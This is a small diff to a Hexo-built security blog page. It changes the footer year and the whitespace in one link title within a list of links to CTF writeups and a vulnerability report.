-<li><a href="https://lorexxar.cn/2018/04/17/0ctf2018-space/" target="_blank" rel="external">TCTF/0CTF2018 h4x0rs.space Writeup</a></li>
+<li><a href="https://lorexxar.cn/2018/04/17/0ctf2018-space/" target="_blank" rel="external">TCTF/0CTF2018 h4x0rs.space Writeup </a></li>
 <li><a href="https://wulidecade.cn/2020/10/08/2020西湖论剑部分web-wp/" target="_blank" rel="external">2020西湖论剑部分web_wp</a></li>
 <li>西湖论剑 WP-Nu1L</li>
 <li><a href="https://120.25.156.28/posts/1.html" target="_blank" rel="external">百度漏洞报告：埋雷式攻击，悄无声息获取用户百度登录密码</a></li>
@@ -678,7 +663,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy; 2022 HACHp1<br>
+            &copy; 2023 HACHp1<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
         </div>
     </div>
